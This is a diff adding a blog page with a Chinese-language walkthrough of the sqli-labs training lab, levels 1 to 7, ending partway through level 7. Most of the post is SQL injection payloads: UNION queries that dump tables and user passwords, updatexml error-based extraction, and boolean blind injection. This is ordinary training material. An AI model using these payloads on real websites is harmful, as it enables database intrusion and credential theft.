@@ -1,0 +1,3171 @@
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <meta name="description" content="这里是 @PurgationDevil 的个人博客，与你一起发现更大的世界">
+    <meta name="keywords" content="PurgationDevil Blog, 博客, 个人网站, 互联网, Web, 逆向, C语言数据结构">
+    <meta name="theme-color" content="#000000">
+
+    <!-- Open Graph -->
+    <meta property="og:title"
+        content="sqli-lebs - PurgationDevil Blog">
+    
+    <meta property="og:type" content="article">
+    <meta property="og:description" content="SQL-labs
+
+基础
+
+Less-1(基础注入)
+
+步骤1：找注入点
+
+检查SQL注入点。
+
+1
+?id=1'--+
+
+
+步骤2：确定字段数
+
+检查列数。（一共3列）
+
+1
+?id=1' order by 3 --+
+
+
+步骤3：确定回显位置
+
+爆库。SQL版本顺便也爆出来。
+
+
+  正常输入?id=1会返回一个用户信息，输入-1（不存在的ID）会让前面的查询返回空结果。
+  UNION...">
+    
+    <meta property="article:published_time" content=" 2026-04-04T00:00:00Z">
+    
+    
+    
+    <meta property="article:tag" content="web">
+    
+    
+    <meta property="og:image" content="https://PurgationDevil.github.iohttps://github.com/PurgationDevil.png">
+    <meta property="og:url" content="https://PurgationDevil.github.io/%E5%88%86%E7%B1%BB%E5%90%8D%E7%A7%B0/2026/04/04/sqli-labs/">
+    <meta property="og:site_name" content="PurgationDevil Blog">
+
+    <title>sqli-lebs - PurgationDevil Blog</title>
+
+    <!-- Web App Manifest -->
+    <link rel="manifest" href="/pwa/manifest.json">
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://PurgationDevil.github.io/%E5%88%86%E7%B1%BB%E5%90%8D%E7%A7%B0/2026/04/04/sqli-labs/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href=" /css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href=" /css/hux-blog.min.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet"
+        type="text/css">
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Loading Animation -->
+    <style>
+    #loader-wrapper {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: 99999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+        transition: opacity 0.3s ease 0.5s;
+    }
+
+    #loader-wrapper::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(10, 15, 30, 0.9);
+        z-index: 0;
+        transition: opacity 0.3s ease;
+    }
+
+    #loader-wrapper.loaded::before {
+        opacity: 0;
+    }
+
+    #loader-wrapper.loaded {
+        pointer-events: none;
+    }
+
+    #loader-wrapper.loaded .loader-left,
+    #loader-wrapper.loaded .loader-right {
+        transform: translateX(0);
+        opacity: 0;
+    }
+
+    #loader-wrapper.loaded .loader-content {
+        opacity: 0;
+        transform: scale(0.8);
+    }
+
+    .loader-left,
+    .loader-right {
+        position: absolute;
+        top: 0;
+        width: 50%;
+        height: 100%;
+        transition: transform 0.8s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.5s ease;
+    }
+
+    .loader-left {
+        left: 0;
+        transform: translateX(0);
+        background: linear-gradient(135deg, rgba(255, 107, 157, 0.3) 0%, rgba(196, 69, 105, 0.2) 100%);
+    }
+
+    .loader-right {
+        right: 0;
+        transform: translateX(0);
+        background: linear-gradient(315deg, rgba(196, 69, 105, 0.2) 0%, rgba(255, 107, 157, 0.3) 100%);
+    }
+
+    #loader-wrapper.loaded .loader-left {
+        transform: translateX(-100%);
+    }
+
+    #loader-wrapper.loaded .loader-right {
+        transform: translateX(100%);
+    }
+
+    .loader-content {
+        position: relative;
+        z-index: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        transition: all 0.5s ease;
+    }
+
+    .loader {
+        position: relative;
+        width: 60px;
+        height: 60px;
+    }
+
+    .loader-circle {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        border-radius: 50%;
+        border: 2px solid transparent;
+        animation: spin 2s linear infinite;
+    }
+
+    .loader-circle:nth-child(1) {
+        border-top-color: rgba(255, 107, 157, 0.8);
+        animation-duration: 1.5s;
+    }
+
+    .loader-circle:nth-child(2) {
+        border-right-color: rgba(196, 69, 105, 0.8);
+        animation-duration: 1.8s;
+        animation-direction: reverse;
+    }
+
+    .loader-circle:nth-child(3) {
+        border-bottom-color: rgba(248, 181, 0, 0.8);
+        animation-duration: 2s;
+    }
+
+    .loader-center {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 15px;
+        height: 15px;
+        background: rgba(255, 107, 157, 0.9);
+        border-radius: 50%;
+        box-shadow: 0 0 15px rgba(255, 107, 157, 0.8), 0 0 30px rgba(255, 107, 157, 0.5);
+        animation: pulse 1s ease-in-out infinite;
+    }
+
+    .loader-text {
+        margin-top: 30px;
+        color: rgba(255, 107, 157, 0.9);
+        font-size: 12px;
+        font-family: 'Montserrat', sans-serif;
+        letter-spacing: 3px;
+        animation: fadeInOut 2s ease-in-out infinite;
+    }
+
+    .loader-progress {
+        margin-top: 20px;
+        width: 120px;
+        height: 3px;
+        background: rgba(255, 255, 255, 0.2);
+        border-radius: 2px;
+        overflow: hidden;
+    }
+
+    .loader-progress-bar {
+        height: 100%;
+        background: linear-gradient(90deg, #ff6b9d, #c44569);
+        border-radius: 2px;
+        animation: progress 2s ease-in-out infinite;
+        width: 0;
+    }
+
+    .loader-percent {
+        margin-top: 10px;
+        color: rgba(255, 107, 157, 0.7);
+        font-size: 10px;
+        font-family: 'Montserrat', sans-serif;
+        letter-spacing: 1px;
+    }
+
+    @keyframes spin {
+        from { transform: rotate(0deg); }
+        to { transform: rotate(360deg); }
+    }
+
+    @keyframes pulse {
+        0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+        50% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.7; }
+    }
+
+    @keyframes fadeInOut {
+        0%, 100% { opacity: 0.5; }
+        50% { opacity: 0.9; }
+    }
+
+    @keyframes progress {
+        0% { width: 0%; }
+        50% { width: 70%; }
+        100% { width: 100%; }
+    }
+
+    @keyframes fadeInUp {
+        from {
+            opacity: 0;
+            transform: translateY(30px);
+        }
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    }
+
+    .content-fade-in {
+        animation: fadeInUp 0.6s ease-out forwards;
+        opacity: 0;
+    }
+
+    .content-hidden {
+        opacity: 0;
+    }
+    </style>
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+
+    <!-- Google AdSense -->
+    <script data-ad-client="ca-pub-6487568398225121" async
+        src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+</head>
+
+
+<div id="loader-wrapper">
+    <div class="loader-left"></div>
+    <div class="loader-right"></div>
+    <div class="loader-content">
+        <div class="loader">
+            <div class="loader-circle"></div>
+            <div class="loader-circle"></div>
+            <div class="loader-circle"></div>
+            <div class="loader-center"></div>
+        </div>
+        <div class="loader-text">LOADING...</div>
+        <div class="loader-progress">
+            <div class="loader-progress-bar"></div>
+        </div>
+        <div class="loader-percent" id="loader-percent">0%</div>
+    </div>
+</div>
+
+<!-- Navigation -->
+
+    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+        
+        <div class="container-fluid">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="/">PurgationDevil Blog</a>
+            </div>
+
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div id="huxblog_navbar">
+                <div class="navbar-collapse">
+                    <ul class="nav navbar-nav navbar-right">
+                        <li><a href="/">首页</a></li>
+                        <li><a href="/about">关于</a></li>
+                        <li><a href="/archive">归档</a></li>
+                        <li class="search-icon">
+                            <a href="javascript:void(0)">
+                                <i class="fa fa-search"></i>
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+    <script>
+        // Drop Bootstarp low-performance Navbar
+        // Use customize navbar with high-quality material design animation
+        // in high-perf jank-free CSS3 implementation
+        var $body = document.body;
+        var $toggle = document.querySelector('.navbar-toggle');
+        var $navbar = document.querySelector('#huxblog_navbar');
+        var $collapse = document.querySelector('.navbar-collapse');
+
+        var __HuxNav__ = {
+            close: function () {
+                $navbar.className = " ";
+                // wait until animation end.
+                setTimeout(function () {
+                    // prevent frequently toggle
+                    if ($navbar.className.indexOf('in') < 0) {
+                        $collapse.style.height = "0px"
+                    }
+                }, 400)
+            },
+            open: function () {
+                $collapse.style.height = "auto"
+                $navbar.className += " in";
+            }
+        }
+
+        // Bind Event
+        $toggle.addEventListener('click', function (e) {
+            if ($navbar.className.indexOf('in') > 0) {
+                __HuxNav__.close()
+            } else {
+                __HuxNav__.open()
+            }
+        })
+
+        /**
+         * Since Fastclick is used to delegate 'touchstart' globally
+         * to hack 300ms delay in iOS by performing a fake 'click',
+         * Using 'e.stopPropagation' to stop 'touchstart' event from 
+         * $toggle/$collapse will break global delegation.
+         * 
+         * Instead, we use a 'e.target' filter to prevent handler
+         * added to document close HuxNav.  
+         *
+         * Also, we use 'click' instead of 'touchstart' as compromise
+         */
+        document.addEventListener('click', function (e) {
+            if (e.target == $toggle) return;
+            if (e.target.className == 'icon-bar') return;
+            __HuxNav__.close();
+        })
+    </script>
+
+<!-- Search -->
+<div class="search-page">
+  <div class="search-icon-close-container">
+    <span class="search-icon-close">
+      <i class="fa fa-chevron-down"></i>
+    </span>
+  </div>
+  <div class="search-main container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <form></form>
+        <input type="text" id="search-input" placeholder="$ grep...">
+        </form>
+        <div id="search-results" class="mini-post-list"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="main-content" class="content-hidden">
+    <!-- Mermaid 支持 -->
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: 'default'
+    });
+    mermaid.init(undefined, document.querySelectorAll('.language-mermaid'));
+  });
+</script>
+
+<!-- 固定目录（跟随滚动） - PC端 -->
+<style>
+.toc-fixed {
+  position: fixed;
+  right: 20px;
+  top: 40%;
+  transform: translateY(-50%);
+  width: 200px;
+  max-height: 60vh;
+  background: rgba(255, 255, 255, 0.95);
+  backdrop-filter: blur(10px);
+  border-radius: 12px;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+  padding: 16px;
+  overflow-y: auto;
+  z-index: 999;
+  border: 1px solid #eaeaea;
+}
+
+.toc-fixed h4 {
+  margin: 0 0 12px 0;
+  font-size: 14px;
+  font-weight: 600;
+  color: #333;
+  padding-bottom: 8px;
+  border-bottom: 2px solid #0085a1;
+}
+
+.toc-fixed ul {
+  list-style: none;
+  padding-left: 0;
+  margin: 0;
+}
+
+.toc-fixed li {
+  margin: 8px 0;
+}
+
+.toc-fixed a {
+  color: #555;
+  text-decoration: none;
+  font-size: 13px;
+  display: block;
+  transition: all 0.2s;
+}
+
+.toc-fixed a:hover {
+  color: #0085a1;
+  transform: translateX(2px);
+}
+
+.toc-fixed a.active {
+  color: #0085a1;
+  font-weight: 500;
+  border-left: 2px solid #0085a1;
+  padding-left: 8px;
+}
+
+/* 滚动条 */
+.toc-fixed::-webkit-scrollbar {
+  width: 4px;
+}
+
+.toc-fixed::-webkit-scrollbar-track {
+  background: #f1f1f1;
+  border-radius: 4px;
+}
+
+.toc-fixed::-webkit-scrollbar-thumb {
+  background: #ccc;
+  border-radius: 4px;
+}
+
+/* 手机端隐藏PC目录 */
+@media (max-width: 992px) {
+  .toc-fixed {
+    display: none;
+  }
+}
+
+@media (prefers-color-scheme: dark) {
+  .toc-fixed {
+    background: rgba(10, 20, 30, 0.95);
+    border: 1px solid #2a3f5f;
+  }
+  
+  .toc-fixed h4 {
+    color: #ffffff;
+    border-bottom-color: #00d4ff;
+  }
+  
+  .toc-fixed a {
+    color: #d4d4d4;
+  }
+  
+  .toc-fixed a:hover {
+    color: #00d4ff;
+  }
+  
+  .toc-fixed a.active {
+    color: #00d4ff;
+    border-left-color: #00d4ff;
+  }
+  
+  .toc-fixed::-webkit-scrollbar-track {
+    background: #1a2735;
+  }
+  
+  .toc-fixed::-webkit-scrollbar-thumb {
+    background: #3a5065;
+  }
+}
+</style>
+
+<script>
+(function() {
+  function initToc() {
+    var article = document.querySelector('.post-container');
+    if (!article) return;
+    
+    var headers = article.querySelectorAll('h2, h3');
+    if (headers.length === 0) return;
+    
+    // 创建PC端目录
+    var tocDiv = document.createElement('div');
+    tocDiv.className = 'toc-fixed';
+    tocDiv.innerHTML = '<h4>📖 目录</h4><ul></ul>';
+    var tocList = tocDiv.querySelector('ul');
+    
+    headers.forEach(function(header, index) {
+      var id = 'toc-' + index;
+      header.id = id;
+      
+      // PC端目录项
+      var li = document.createElement('li');
+      var a = document.createElement('a');
+      a.href = '#' + id;
+      a.textContent = header.textContent;
+      a.addEventListener('click', function(e) {
+        e.preventDefault();
+        document.getElementById(id).scrollIntoView({ behavior: 'smooth', block: 'start' });
+      });
+      li.appendChild(a);
+      tocList.appendChild(li);
+    });
+    
+    document.body.appendChild(tocDiv);
+    
+    // 高亮当前章节
+    var tocLinks = document.querySelectorAll('.toc-fixed a');
+    window.addEventListener('scroll', function() {
+      var scrollPos = window.scrollY + 100;
+      var currentId = null;
+      
+      headers.forEach(function(header) {
+        var offsetTop = header.offsetTop;
+        if (offsetTop <= scrollPos) {
+          currentId = header.id;
+        }
+      });
+      
+      tocLinks.forEach(function(link) {
+        link.classList.remove('active');
+        var href = link.getAttribute('href').substring(1);
+        if (href === currentId) {
+          link.classList.add('active');
+        }
+      });
+    });
+  }
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initToc);
+  } else {
+    initToc();
+  }
+})();
+</script>
+
+<!-- Image to hack wechat -->
+<!-- <img src="/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="/img/home-bg.jpg" width="0" height="0"> -->
+
+<!-- Post Header -->
+
+
+
+<style type="text/css">
+    header.intro-header{
+        position: relative;
+        background-image: url('/img/home-bg.jpg');
+        background: ;
+    }
+
+    
+</style>
+
+
+
+
+<header class="intro-header" >
+
+    <div class="header-mask"></div>
+    
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/archive/?tag=web" title="web">web</a>
+                        
+                    </div>
+                    <h1>sqli-lebs</h1>
+                    
+                    <h2 class="subheading"></h2>
+                    <span class="meta">Posted by PurgationDevil Blog on April 4, 2026</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+
+
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <!-- Multi-Lingual -->
+                
+
+				<h1 id="sql-labs">SQL-labs</h1>
+
+<h2 id="基础">基础</h2>
+
+<h3 id="less-1基础注入">Less-1(基础注入)</h3>
+
+<p><strong>步骤1：找注入点</strong></p>
+
+<p>检查SQL注入点。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">'--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>步骤2：确定字段数</strong></p>
+
+<p>检查列数。（一共3列）</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' order by 3 --+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>步骤3：确定回显位置</strong></p>
+
+<p>爆库。SQL版本顺便也爆出来。</p>
+
+<ul>
+  <li>正常输入<code class="language-plaintext highlighter-rouge">?id=1</code>会返回一个用户信息，输入<code class="language-plaintext highlighter-rouge">-1</code>（不存在的ID）会让<strong>前面的查询返回空结果</strong>。</li>
+  <li><code class="language-plaintext highlighter-rouge">UNION</code>只有当第一个查询为空时，才会显示第二个查询的结果</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' union select 1,database(),version()--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>步骤4：获取表名</strong></p>
+
+<p>爆表。</p>
+
+<ul>
+  <li>用 <code class="language-plaintext highlighter-rouge">group_concat()</code>把多个表名合并成一个字符串，因为回显位置有限，这样可以一次性看到所有表名。</li>
+  <li><code class="language-plaintext highlighter-rouge">information_schema.tables</code>表示该数据库下的<code class="language-plaintext highlighter-rouge">tables</code>表，点表示下一级。</li>
+  <li><code class="language-plaintext highlighter-rouge">where</code>后面是条件。</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='</span><span class="k">security</span><span class="s1">'--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>步骤5：获取users表的列名</strong></p>
+
+<p>寻找自己想要的信息。</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">information_schema.columns</code>表示该数据表下的数据，点表示下一级。</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span><span class="n">users</span><span class="s1">'--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>步骤6：获取数据</strong></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">' union select 1,2,group_concat(username ,id , password) from users--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="less-2less-3less-4闭合判断">Less-2、Less-3、Less-4(闭合判断)</h3>
+
+<p><strong>Less-2</strong>     测试注入发现，返回了语法错误。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">'
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>尝试更改payload（本题为数字型，不需要加闭合）</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="c1">--+</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>剩下的与第一题一样。</p>
+
+<ul>
+  <li><strong>数字运算测试法</strong></li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">2</span><span class="o">-</span><span class="mi">1</span>  <span class="c1">-- 如果显示的是id=1的内容，就是数字型</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">2</span><span class="o">-</span><span class="mi">1</span>  <span class="c1">-- 如果显示id=2的内容，就是字符型</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<ul>
+  <li><strong>错误信息分析法</strong></li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="err">\</span>  <span class="c1">-- 反斜杠</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="nv">"  -- 双引号
+?id=1)  -- 括号
+?id=1') -- 组合
+?id=1"</span><span class="p">))</span><span class="c1">-- 组合</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Less-3</strong>     字符型但带括号。闭合方式：<code class="language-plaintext highlighter-rouge">')</code></p>
+
+<p><strong>Less-4</strong>     双引号字符型。闭合方式：<code class="language-plaintext highlighter-rouge">")</code></p>
+
+<h3 id="less-5less-6报错注入">Less-5、Less-6(报错注入)</h3>
+
+<p><strong>Less-5</strong>     基础报错注入</p>
+
+<p><strong>报错注入原理：</strong>输入后不显示回显结果只显示对错，明显的报错注入。<em>union select 失效</em></p>
+
+<ul>
+  <li><strong>核心函数</strong>：<code class="language-plaintext highlighter-rouge">updatexml()</code> 或 <code class="language-plaintext highlighter-rouge">extractvalue()</code></li>
+</ul>
+
+<p><strong>长度限制</strong>：报错只显示32位，超长要用<code class="language-plaintext highlighter-rouge">substr()</code>分段</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and updatexml(1,concat(0x7e,database()),1)--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>代码形象解释：</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="c1">-- 正常：EXTRACTVALUE(xml, '/person/name')</span>
+<span class="c1">-- 注入：EXTRACTVALUE(1, concat('~', database()))</span>
+
+<span class="c1">-- 执行过程：</span>
+<span class="mi">1</span><span class="p">.</span> <span class="n">MySQL</span><span class="err">说：我来解析第二个参数作为</span><span class="n">XPath</span><span class="err">路径</span>
+<span class="mi">2</span><span class="p">.</span> <span class="err">一看：</span><span class="nv">"~security"</span> <span class="err">←</span> <span class="err">这什么鬼路径？波浪号开头？</span>
+<span class="mi">3</span><span class="p">.</span> <span class="n">MySQL</span><span class="err">：语法错误！报错信息里把</span><span class="nv">"~security"</span><span class="err">吐出来</span>
+<span class="mi">4</span><span class="p">.</span> <span class="err">你：哈哈，数据库名叫</span><span class="k">security</span><span class="err">！</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>同理继续向下查询。爆表名。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span><span class="k">security</span><span class="s1">')),1)--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>爆字段（注意：updatexml报错只显示32位左右，可能截断[citation:5]）</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span><span class="n">users</span><span class="s1">')),1)--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>最后爆数据</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and updatexml(1,concat(0x7e,(select concat(username,'</span><span class="p">:</span><span class="s1">',password) from users limit 0,1)),1)--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Less-6</strong>     单引号变双引号。剩下的与第五关一样。</p>
+
+<h3 id="less-7布尔盲注过程">Less-7(布尔盲注过程)</h3>
+
+<p><strong>一、确认闭合</strong></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">'))--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>确定是布尔盲注。（页面只返回“是”、“否”、“错误”）</p>
+
+<p><strong>二、确认列数(3列)</strong></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">')) order by 3--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>三、使用布尔盲注</strong></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">')) and length(database())=8--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>库名长度为8</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">')) and ascii(substr(database(),1,1))=115--+
+?id=1'</span><span class="p">))</span> <span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">101</span><span class="c1">--+</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>库名第一个字母是s,第二个字母是e。继续向下得出库名为 <code class="language-plaintext highlighter-rouge">security</code></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">')) and (select count(table_name) from information_schema.tables where table_schema='</span><span class="k">security</span><span class="s1">')=4--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>获取到表的数量有4个</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">')) and length(select table_name from information_schema.tables where table_schema='</span><span class="k">security</span><span class="s1">' limit 0,1)=4--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
